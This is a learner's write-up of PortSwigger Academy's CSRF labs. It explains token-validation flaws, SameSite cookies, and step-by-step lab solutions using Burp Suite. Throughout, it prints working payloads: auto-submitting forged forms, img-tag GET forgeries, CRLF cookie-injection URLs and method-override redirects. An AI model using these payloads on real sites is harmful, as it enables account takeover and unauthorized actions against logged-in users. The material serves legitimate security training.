# Cross-site request forgery (CSRF) [PortSwigger Academy]

<sup>This write-up covers the Cross-site request forgery section of Web Security Academy by PortSwigger.</sup>

## What is CSRF

_Cross-site request forgery (CSRF)_ --- a type of web security flaw where an attacker tricks a user into unintentionally carrying out actions on a website they're already authenticated with. This exploit allows the attacker to bypass some protections of the same-origin policy, which is meant to stop one website from affecting another.

## What is the impact of a CSRF attack?

In a successful CSRF attack, the attacker manipulates the victim into performing an action they didn't intend to. This could include things like changing their account's email address or password, or even initiating a money transfer. Depending on what the action does, the attacker might end up gaining full access to the victim's account. If the targeted user holds admin or elevated privileges, the attacker could potentially take over the entire application, including all of its data and features. 

## How does CSRF work?

For a CSRF attack to succeed, three main conditions must be met:

1. __A valuable action__ --- There must be a meaningful action in the application that the attacker wants the user to unknowingly perform. This could be something high-impact like changing another user's permissions or something personal like updating the victim's password.
2. __Session tracked via cookies only__ --- The application uses session cookies to recognize users, and doesn't rely on any additional safeguards (like tokens or custom headers) to validate the ligitimacy of the request. 
3. __Predictable request structure__ --- The attacker must be able to predict or know all required parameters in the request. If the request needs something the attacker can't guess (like the user's current password), the attack won't work. 

### How does CSRF work? - Continued

Let's say a web app lets users update their email addresses. When someone changes theirs, the browser sends a request like this:

```
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE  

email=wiener@normal-user.com  
```

This situation is vulnerable to CSRF because:

- __The action is valuable to an attacker__ --- If the attacker changes the user's email, they can later reset the password and hijack the account.
- __Session is tracked only by a cookie__ --- The app uses a session cookie to recognize the user but doesn't have any extra protection like CSRF tokens.
- __The request parameters are predictable__ --- The attacker knows what data to send and can craft the request easily. 

### How does CSRF work? - Continued

The attacker hereby can use this situation and create a web page with the following HTML:

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

What this does:

- The `<form>` is set up to submit a request to the vulnerable site's endpoint that handles email address changes.
- The form has a hidden input field that sets the new email to an attacker controlled address (`pwned@evil-user.net`)
- The JavaScript at the bottom automatically submits the form as soon as the page loads.

### How does CSRF work? - Continued

How it works in a real attack:

The attacker sends this malicious HTML to the victim, maybe by embedding it in a blog post, an ad, or a phishing email. If the victim is __already logged in__ to the vulnerable website in the same browser:
- Their browser will include the session cookie automatically with the request.
- The vulnerable website will think the request is coming from the legitimate user.
- The email address on the user's account will be silently changed to the attacker's address.

After that, the attacker can trigger a password reset, receive the reset link at their own email, and take over the victim's account --- without the user ever realizing it. 

> NOTE: Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.

## How to construct a CSRF attack

Writing the HTML code for a CSRF attack manually can be tedious --- especially if the request has lots of parameters or behaves in a strange way. Fortunately, __Burp Suite Professional__ has built-in __CSRF Proof of Concept (PoC) generator__ that makes this process much easier:

Here's how you use it:
1. __Find a request__ in Burp Suite that you want to test for CSRF (for example, one that changes a user's email or password).
2. __Right-click__ the request and go to `Engagement tools -> Generate CSRF PoC`
3. Burp Suite will then automatically create the basic HTML needed to replicate the request. _(Note: It won't include cookies --- those are added automatically by the browser when the victim is logged in.)_
4. You can __adjust the generated HTML__ using the PoC generator's settings. This is useful if the request has special requirements or unusual behavior.
5. Finally, copy the HTML into a page and open it in a browser where the victim is already logged in to the vulnerable site. If the exploit works, the request will be sent and the action (like changing the email) will be performed --- without user consent. 

### Lab: CSRF vulnerability with no defenses

Launch Burp Suite, go to __Proxy__ and open browser. Access lab in the browser and log in with credentials `wiener:peter`.

Submit the "Update email" form and find the resulting request in the Proxy history. Request body:

```
email=attacker%40fakemail.com
```

Right click the request and select "Copy URL". Use the URL in the following HTML template:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

On the lab web page click "Go to exploit server" and paste the resulting HTML to the __Body__ section of the form. Click "Store". 

Click "view exploit" and then check the resulting HTTP request and response to verify that the exploit works. Request body:

```
email=anything%2540web-security-academy.net
```

Change the email address in your exploit so that it doesn't match your own.

Click "Deliver to victim" to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab01_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## How to deliver a CSRF exploit

Cross-site request forgery (CSRF) attacks are delivered in much the same way as reflected XSS attacks. Typically the attacker hosts the malicious HTML on a website they control and tricks users into visiting it --- often by sending them a link via email, messaging apps, or social media. In some cases, the attacker can embed the exploit in a comment or post on a popular website, simply waiting for users to visit and trigger the attack. 

In simpler CSRF cases, the attack uses the `GET` method and can be executed entirely through a single malicious URL pointing to the vulnerable site. In these scenarios, the attacker may not even need to use an external website --- they can just send the target a crafted link on the vulnerable domain. For instance, if changing a user's email address is possible via a `GET` request, an attacker could exploit this with something as simple as:

```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

When the image loads, the browser sends the `GET` request automatically --- potentially changing the user's email without their knowledge. 

## Common defences against CSRF

These days, identifying and exploiting CSRF vulnerabilities usually means overcoming built-in protections implemented by the web application, the user's browser, or both. The most common CSRF defenses you'll come across include:

- __CSRF Tokens__ --- These are unique, secret values generated by the server and sent to the client. When the user tries to perform an important action, like submitting a form, the request must include the correct token. This makes it very difficult for attackers to forge valid requests, since they can't easily guess or retrieve the required token.

- __SameSite Cookies__ --- This browser feature controls whether cookies are included in cross-origin requests. Since sensitive actions usually require an authenticated session cookie, the SameSite policy may block the attack from working if the request comes from another domain. As of 2021, Chrome defaults to `SameSite=Lax`, and other browsers are expected to follow this standard.

- __Referer Header Checks__ --- Some applications use the HTTP `Referer` header to check if the request originated from their own domain. While this can help detect cross-site requests, it's generally not as reliable as proper CSRF token validation.

## What is a CSRF token?

A CSRF token is a random, secret value created by the server and sent to the client. It's used to verify that a sensitive action --- like submitting a form --- is being performed intentionally by the legitimate user. If the request doesn't include the correct token, the server will reject it.

One common method of passing the CSRF token to the client is by embedding it as a hidden field within HTML forms. For example:

```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

This ensures that any submitted request includes the token, helping the server confirm its legitimacy.

### What is a CSRF token? - Continued

When the form is submitted, it sendsa request like this:

```
POST /my-account/change-email HTTP/1.1  
Host: normal-website.com  
Content-Length: 70  
Content-Type: application/x-www-form-urlencoded  

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

If CSRF tokens are implemented properly, they provide strong protection against cross-site request forgery. Since the attacker can't guess the token's value, they can't include it in a forged request --- making it very unlikely for the attack to succeed.

> NOTE: CSRF tokens aren't limited to being hidden form fields in `POST` requests. Some applications pass them in HTTP headers or through other means. The method used to send the token plays a crucial role in the overall effectiveness of the defense. For further details, refer to best practices for preventing CSRF vulnerabilities.

## Common flaws in CSRF token validation

CSRF vulnerabilities often occur because the application fails to properly validate CSRF tokens. This section outlines some of the most common mitakes that allow attackers to bypass these protections. For example some applications validate CSRF tokens only for `POST` requests but neglect to apply the same checks for `GET` requests.

### Validation of CSRF token depends on request method

In such cases, an attacker can exploit this oversight by switching to a `GET` request to carry out the CSRF attack, like so:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1  
Host: vulnerable-website.com  
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

### Lab: CSRF where token validation depends on request method

Open Burp's browser, navigate to the lab web address and log in with credentials `wiener:peter`. 

Submit the "Update email" form and find the associated request in __Proxy__ > __History__. 
_Request body:_
```
email=attacker%40fakemail.com&csrf=[[...token...]]
```

Send this request to __Repeater__ by right-clicking it and selecting "Send to Repeater" change the `csrf` parameter in the request body to anything else and resend the request. 
_Response:_
```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"
```

As we can see the CSRF token was rejected ("Invalid CSRF token") and the request didn't go through ("400 Bad Request").

Click the __Context Menu__ (three dashes; top-right corner of the request pane) of this request and select __Change request method__. This will automatically convert it into a `GET` request. Resend the request and observe the response:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

CSRF token is no longer verified for `GET` requests. Open the __Context Menu__ again and select "Copy URL". Place this URL in the following HTML template inside the `<form>` tag's `action` attribute's value:

> NOTE: If the copied URL has any query parameters (like `?email=email@email.com&csrf=asdasdh`) remove them before clicking "Store". Also, for me encoding `anything%40web-security-academt.net` didn't work, so I replaced it with `@` symbol in the HTML instead and succeeded.

```
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

From the top bar of the lab web page, click "Go to exploit server" and paste the resulting HTML into the "Body" section of the form, then click "Store".

Click "View exploit" to check if the exploit works by trying it on yourself. Check the resulting HTTP request and response in __Proxy__ > __History__. And also notice the changed email on `/my-account?id=wiener` page you were redirected to. 

```
Your email is: anything@web-security-academy.net
```

Go back to the exploit server and change the email value in the HTML body to anything but the above. Click "Store" and then "Deliver to victim" to solve the lab.

> NOTE: Check out [walkthrough](csrf_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### Validation of CSRF token depends on token being present

Some applicaiton correctly validate the CSRF token if it is presend, but skip the validation entirely if it is omitted.

In these cases, an attacker can remove the parameter that stores a CSRF token as its value entirely (not just the value) and bypass the validation to deliver a CSRF attack.

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

### Lab: CSRF where token validation depends on token being present

Open Burp's browser, navigate to the lab and log in with credentials `wiener:peter`. 

Submit "Update email" form and find the request in __Proxy__ > __History__ section. 

_Request body:_

```
email=email@email.com&csrf=[[...token...]]
```

Right-click the request and select __Send to Repeater__. In the repeater, notice, if you change the CSRF token in the request body and resend the request it will be rejected. 

_Response:_

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"
```

Now delete the `csrf` parameter in the request body entirely, including its value and resend the request.

_Request body:_

```
email=email@email.com
```

The request was accepted this time.

_Response:_

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

Now open the __Context Menu__ (top right corner of the request pane in __Repeater__; three dashes) and click "Copy URL". Use this URL in the following HTML template (`<form>` tag `action` attribute):

> NOTE: edit the second line, attribute `name` should have a value `email` and attribute `value` should have an email to replace the existing email address.

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

Go to exploit server and paste the resulting HTML in the "Body" section of the form and click "Store". 

Click "View exploit" to see if it works on your account. You will be redirected to a page where you'll see that your email has been changed. 

Now go back to the exploit server and change the `value` attribute in the second line of the HTML to any other email than the one your account was changed to. Click "Deliver to victim" to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### CSRF token is not tied to the user session

Some applications fail to check whether the CSRF token is tied to the specific session of the user making the request. Instead, they keep a global list of all issued tokens and accept any one of them, regardless of which user it was generated for. 

In this case, an attacker could simply log in with their own account, grab a valid CSRF token, and then include that token in a CSRF payload aimed at the victim. Since the application accepts any token from the global pool, the malicious request will go through successfully. 

### Lab: CSRF where token is not tied to user session

Open Burp's browser and log in using credentials `wiener:peter`. Make sure to turn on __Intercept__ and then submit "Update email" form, and check the resulting request in __Proxy__.

Make a note of the value of the CSRF token, then drop the request. Now within the Burp's browser open an incognito window, log in using credentials `carlos:montoya`.

Again make sure to turn on __Intercept__ and submit "Update email" form and send this `POST /my-account/change-email` request to __Repeater__. 

Replace the CSRF token in the request body with the one you made a note of earlier and send the request. 

_Response:_

```
HTTP/2 302 Found
Location: /my-account?id=carlos
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

This means, that an unused (request was dropped, before it went through) CSRF token we made note of from `wiener:peter` session was used in the `carlos:montoya` session and it still went through. 

Now let's use the HTML payload from the [one of the sections above](#what-is-a-csrf-token).:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="obscure@email.com">
    <input type="hidden" name="csrf" value="[[...token...]">
</form>
<script>
        document.forms[0].submit();
</script>
```

Replace URL inside `<form>` tag's `action` parameter with the URL of the request we just intercepted and email (`<input name="email"...`) with something we haven't used in this lab so far. Click "Go to exploit server" and paste the resulting HTML in the body section.

Now go back to the lab and log in as `wiener:peter`, intercept the "Update email" request again, copy and save the CSRF token in the request and drop the request again. 

Back to the exploit server and paste the copied CSRF request in the HTML template `<input name="csrf"...` to a `value` parameter. 

Click "Store" and then "Deliver to victim" to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab04_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### CSRF token is tied to a non-session cookie

A variation of the previous flaw occurs, when the application links the CSRF token to a cookie, but not the one actually used for session tracking. This often happens when different frameworks are used for managing sessions and CSRF protection, and they don't work together seamlessly.

For example, an application might assign one cookie for session identification and another separate cookie for CSRF validation. If these are not properly linked, an attacker could potentially exploit the disconnect. Here's a typical request that demonstrates this setup:

```
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 68  
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

In this situation, even if the token is validated against a cookie, the lack of connection to the session cookie can render the defense ineffective. 

### CSRF token is tied to a non-session cookie - Continued

This scenario is more challenging to exploit, but the vulnerability still exists. If the target website has any functionality that enables an attacker to set a cookie in the victim's browser, a CSRF attack can still be carried out.

In practice, the attacker would log into the vulnerable application using their own account, retrieve a valid CSRF token and its corresponding cookie, and then use the available cookie-setting feature to inject their own cookie into the victim's browser. After that, they deliver a CSRF payload that includes the attacker's token, which will now be accepted by the server due to the matching cookie.

> NOTE: The functionality used to set the cookie doesn't have to reside in the same application that has the CSRF flaw. Any application on the same parent domain can potentially be abused to set cookies that apply to the target app. For instance, a cookie-setting endpoint on `stating.demo.normal-website.com` could be used to inject a cookie that is valid for `secure.normal-website.com`, as long as the cookie's domain and path attributes are appropriately scoped.

### Lab: CSRF where token is tied to non-session cookie

Open Burp's browser and log in with credentials `wiener:peter`. Submit the "Update email" form an find the resulting request in __Proxy__ > __History__. 

Right-click the request and select __Send to Repeater__. If you change the `session` cookie, you will be logged out.

_Response:_

```
HTTP/2 302 Found
Location: /login
Set-Cookie: session=[[...session_cookie...]]; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

But if you change the `csrfKey` cookie, the CSRF token will be rejected. 

_Response:_

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"
```

This suggests, that csrfKey cookie may not be strictly tied to the session. 

> NOTE: Before proceeding, __save__ the value for `csrfKey` cookie and `csrf` parameter from the request body somewhere. Disregard `session` cookie.

In Burp's browser, open a private incognito window and log in with credentials `carlos:montoya`. "Update email" once again and send the request from __Proxy__ > __History__ to Burp __Repeater__. 

Now copy `csrfKey` cookie value and `csrf` request body parameter from `POST /my-account/update-email` request made by `wiener` and paste them in place of the same values in a request made by `carlos`. After sending the request, you can see that it's accepted. 

_Response:_

```
HTTP/2 302 Found
Location: /my-account?id=carlos
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Close the __Repeater__ tab and incognito browser. Back in the original browser (logged in as `wiener`), perform a search, send the resulting request to Burp Repeater and observe that the search term gets reflected in the `Set-Cookie` header. 

_Response:_

```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=search; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3422
```

Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser. Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

- `%0d%0a` --- URL encoding for __carriage return (CR)__ and __line feed (LF)__ which is `\r\n` in ASCII. 
- `%3b` --- is __semicolon__ or `;`.
- `%20` --- is a __whitespace__.

_Decoded URL:_

```
/?search=test
Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
```

Now let's borrow an HTML template from one of the above labs, include both email and CSRF token inputs, but __DO NOT__ include the `<script>document.forms[0].submit();</script>`. Instead replace it with:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="obscure@email.com">
    <input type="hidden" name="csrf" value="[[...token...]">
</form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

This will perform a search, inject our `csrfKey` cookie through search request and submit this `/change-email` form with given properties (`email` and `csrf`). 

Now turn on __intercept__ in Burp Proxy and perform an "Update email" request. Save `csrfKey` cookie value and `csrf` parameter value from request body and drop this request.

Use these in the HTML template above and also add an email you haven't used before. 

Click "Go to exploit server" and paste the resulting HTML into the "Body" section of the form. Click "Store".

Click "Deliver exploit to victim" to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab05_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### CSRF token is simply duplicated in a cookie

In another variation of the previous vulnerability, some applications avoid keeping any server-side record of issued CSRF tokens. Instead, they use a method known as the __"double submit"__ strategy. In this approach, the application sends the same CSRF token to the client in two places: one as a cookie and the other as a request parameter (typically in a form). When a request is received, the server simply checks whether the value in the request matches the one in the cookie. This technique is often promoted for its simplicity and the fact that it doesn't require maintaining server-side state. 

_Example request:_

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

In this setup, an attacker can still exploit the CSRF vulnerability if they can find any way to set a cookie in the victim's browser. The attacker doesn't even need a valid token --- they can generate a fake token, use a cookie-setting feature to plant it into the victim's browser, and include the same value in the CSRF payload. As long as both values match, the server will accept the request.

### Lab: CSRF where token is duplicated in cookie

Open Burp's browser and log in with credentials `wiener:peter`. Submit the "Update email" form and find the resulting `POST /my-account/change-email` request in __Proxy__ > __History__. 

Right-click the request and select "Send to Repeater". 

The value of the `csrf` request body parameter is being validated simply by comparing it to the `csrf` cookie. To test against this, let's change `csrf` body parameter and send the request. Then give identical changed value to the `csrf` cookie as well and send the request. Compare the responses:

In the first case:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"
```

In the second case:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

So the hypothesis checks out. Now, let's perform a search on the web lab and send the resulting `GET /?search=anyterm` request to __Repeater__. The search term gets reflected in the Set-Cookie header of the response:

```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=anyterm; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3405
```

Since the search function has no CSRF protection, this can be used to inject cookies into the victim user's browser. Let's craft a URL that uses this vulnerability to inject a fake `csrf` cookie into the victim's browser:

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

- `%0d%0a` --- URL encoding for __carriage return (CR)__ and __line feed (LF)__ which is `    \r\n` in ASCII.
- `%3b` --- is __semicolon__ or `;`.
- `%20` --- is a __whitespace__.

Now let's create a proof of concept exploit as an HTML template, ensuring that CSRF input value is set to fake:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="obscure@email.com">
    <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

Make sure the email `input` value is not your own email. Click "Go to exploit server" and paste the above HTML in the "Body" section and click Store. If everything is alright, click "Deliver exploit to victim" to solve the lab. 

> NOTE: Seeing as how similar this lab is to the previous one, the walkthrough of it in OWASP Zed Attack Proxy is unnecessary and hence, not included. 

## Bypassing SameSite cookie restrictions

SameSite is a browser-based security feature that controls when cookies are included in requests made from one site to another. It offers some protection against a range of cross-site attacks, including CSRF, data leakage between sites, and certain CORS-related exploits.

As of 2021, Chrome automatically applies `SameSite=Lax` settings to cookies by default, unless the issuing site explicitly sets a different policy. This behavior is part of a proposed web standard, and it's expected that other major browsers will follow suit. Because of this, understanding how SameSite works --- and how attackers might bypass it --- is crucial for identifying and testing cross-site vulnerabilities effectively. 

This section will explain the mechanics of the SameSite attribute, introduce key terms and explore common bypass techniques that can allow attackers to perform CSRF or other cross-site attacks even when initial defenses appear to be in place.

## What is a site in the context of SameSite cookies?

In the context of SameSite cookie restrictions, a "site" is defined by the top-level domain (TLD) such as `.com` or `.net`, combined with the immediate subdomain, more commonly referred to as __TLD+1__. For example, in `app.example.com` the site is considered `example.com`.

When browsers determine whether a request is same-site or cross-site, they also take the URL scheme (HTTP vs HTTPS) into account. This means that even if the domain is the same, a request from `http://app.example.com` to `https://app.example.com` will usually be treated as cross-site. 

!["Site Definition"](site-definition.png "Site Definition")

> NOTE: You might encounter the term __effective top-level domain (eTLD)__, which accounts for multi-part suffixes used as TLDs in practice --- like `.co.uk`. So for `store.example.co.uk`, the effective site would be `example.co.uk`. 

### What's the difference between a site and an origin?

The key distcintion between a __site__ and an __origin__ lies in their __scope__. A __site__ can include several subdomains under the same base domain, while an origin is more precise, requiring an exact match of __scheme__, __domain__, and __port__. Although the two terms are related, they should not be used interchangeably --- doing so can lead to security oversights.

Two URLs share the __same origin__ only if they match in all three components: scheme, domain name, and port (the port is usually assumed based on the scheme, like 443 for HTTPS). On the other hands, same-site checks are more lenient, focusing on the scheme and base domain (TLD+1), without requiring the port or subdomain to match.

!["Site vs Origin"](site-vs-origin.png "Site vs Origin")

The distinction is important because a request can be __same-site__ but not __same-origin__, which opens up potential for cross-origin vulnerabilities that bypass site-level protections. 

| Request From             | Request To                  | Same-site? | Same-origin?                |
|--------------------------|-----------------------------|------------|-----------------------------|
| https://example.com      | https://example.com         | Yes        | Yes                         |
| https://app.example.com  | https://intranet.example.com| Yes        | No (different subdomains)  |
| https://example.com      | https://example.com:8080    | Yes        | No (different port)        |
| https://example.com      | https://example.co.uk       | No         | No (different domain)      |
| https://example.com      | http://example.com          | No         | No (different scheme)      |

The difference matters, especially in scenarios where executing arbitrary JavaScript on one subdomain could allow an attacker to exploit protections on other subdomains within the same site. We'll explore an example of this in an upcoming lab. 

## How does SameSite work?

Before the introduction of the SameSite attribute, browsers would automatically include cookies in every request sent to the domain that created them --- even when those requests were initiated by unrelated third-party sites. The SameSite mechanism allows browsers and developers to control whether, and under what conditions, cookies are sent with cross-site requests. 

This is particularly useful in mitigating CSRF attacks, where an attacker tries to trick a user's browser into making an authenticated request to a vulnerable website. Since such attacks often depend on the presence of the user's session cookie, blocking the cookie in cross-site scenarios can prevent the malicious action from succeeding. 

Today, all major browsers support three SameSite policy levels:

- `Strict`
- `Lax`
- `None`

### How does SameSite work? - Continued

Developers can define how cookies behave in cross-site scenarios by setting a specific restriction level using the `SameSite` attribute in the `Set-Cookie` header. This gives them greater control over how and when cookies are included in requests. For example:

```
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

While applying these settings can help defend against CSRF attacks, they don't offer complete protection. We'll explore the limitations of these defenses through interactive labs that demonstrate real-world vulnerabilities.

> NOTE: If a site doesn't explicitly define a SameSite policy, Chrome will default to applying `SameSite=Lax`. This default behavior restricts cookies from being sent in most cross-site scenarios unless certain conditions are met. Since this is a proposed standard, other major browsers are likely to follow suit.

### `Strict`

When a cookie is configured with `SameSite=Strict` attribute, browsers will completely exclude it from any cross-site requests. In other words, if the site receiving the request differs from the one currently displayed in the browser's address bar, the cookie won't be sent. 

This setting is ideal for cookies that grant access to sensitive actions or data --- such as accessing protected pages or modifying user information --- since it provides the highest level of protection.

However while it offers strong security, this strict setting can interfere with legitimate cross-site interactions and negatively affect the overall user experience.

### `Lax`

With `SameSite=Lax` restrictions, browsers will send the cookie along with cross-site requests, but only if two conditions are satisfied:

- The request must use the `GET` method.
- The request must result from a user-initiated top-level navigation, such as clicking a hyperlink.

As a result, cookies are not sent with cross-site `POST` requests, which are commonly used to carry out actions that alter data or application state --- making them prime targets for CSRF attacks.

Additionally, cookies under Lax restrictions are not included in background requests, like those triggered by JavaScript, iframes, or embedded content such as images and stylesheets.

### `None`

Setting a cookie with `SameSite=None` turns off SameSite restrictions entirely, allowing the cookie to be included in all requests to the issuing site --- even those initiated by unrelated third-party websites. 

In most browsers (except Chrome), this is the default behavior if the `SameSite` attribute isn't explicitly defined when the cookie is set.

There are valid use cases for disabling SameSite protections --- for example, if the cookie is meant to be accessed in a third-party context and doesn't provide access to sensitive features or data. A common use case is tracking cookies used for advertising or analytics.

### `None` - Continued

If you come across a cookie that users `SameSite=None` or has no specified SameSite restrictions, it's worth checking whether the cookie is actiually necessary. When Chrome first introduced its "Lax-by-default" policy, it unintentionally disrupted many existing web features. As a quick fix, some developers chose to disable SameSite protections across all cookies --- even those handling sensitive information.

However, when using `SameSite=None`, the cookie must also include the `Secure` flag, meaning it will only be transmitted over HTTPS. If this attribute is missing, the browser will reject the cookie and refuse to store it. 

Example:

```
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
```

## Bypassing SameSite Lax restrictions using GET requests

In real-world scenarios, severs often don't strictly enforce whether a request uses `GET` or `POST` --- even on endpoints that expect form submissions. If session cookies are protected with `SameSite=Lax` (either intentionally or by default), you might still be able to execute a CSRF attack by triggering a `GET` request from the victim's browser.

As long as the request is initiated by a top-level navigation (like clicking a link or using JavaScript redirection), the browser will include the user's session cookie. One of the simplest ways to exploit this is by redirecting the victim to a malicious URL, like so:

```
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

### Bypassing SameSite Lax restrictions using GET requests - Continued

Even if a standard `GET` request isn't permitted, some web frameworks offer ways to override the HTTP method declared in the request. For instance, Symfony supports a special `_method` parameter in forms, which can override the request method for routing purposes:

```
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Other frameworks may use different parameters to achieve similar method overriding behavior.

### Lab: SameSite Lax bypass via method override

Open Burp's browser, navigate to the lab, log in with credentials `wiener:peter` and change the email address.

In the __Proxy__ > __HTTP History__ open the `POST /my-account/change-email` request and notice that CSRF tokens aren't present in the request headers or body, so it may be vulnerable to CSRF if SameSite cookie restrictions could be bypassed.

```
POST /my-account/change-email HTTP/2
Cookie: session=QS1ZuEkD2NX4Y31caMnDO47vvyUki87f

email=attacker%40fakemail.com
```

In the __Proxy__ > __HTTP History__ open the `POST /login` request and check the response. The website doesn't explicitly specify any SameSite restrictions when setting session cookies. This means the browser will use the default `Lax` restriction. 

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3247
```

As a result, the session cookie will be sent in cross-site `GET` requests, as long as they involve a top-level navigation. 

Right-click the `POST /my-account/change-email` request and select "Send to Repeater". Right click on the request there and sleect "Change request method". An equivalent `GET` request will be automatically generated. 

```
GET /my-account/change-email?email=attacker%40fakemail.com HTTP/2
Cookie: session=QS1ZuEkD2NX4Y31caMnDO47vvyUki87f
```

Send the request. Observe that the endpoint only allows `POST` requests.

```
HTTP/2 405 Method Not Allowed
Allow: POST

"Method Not Allowed"
```

Try overriding the method by adding the `_method` parameter to the query string:

```
GET /my-account/change-email?email=foo%40bar.com&_method=POST HTTP/2
```

The request seems to have been accepted by the server:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

In the browser, go to the account page and confirm that your email address has changed:

```
# My Account
Your username is: wiener
Your email is: foo@bar.com
``` 

In the browser click "Go to exploit server" and paste the following HTML template in the "Body" section:

```
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

It induces the viewer's browser to issue the malicious `GET` request with a `_method` override and `email` as query parameters. Click "Store" and then click "View exploit". It will redirect you to the `/my-account` page where your email should be changed to `pwned@web-security-academy.net`. This means the exploit works.

Change the email address to the exploit back to `foo@bar.com` and click "Deliver exploit to victim" to solve the lab.

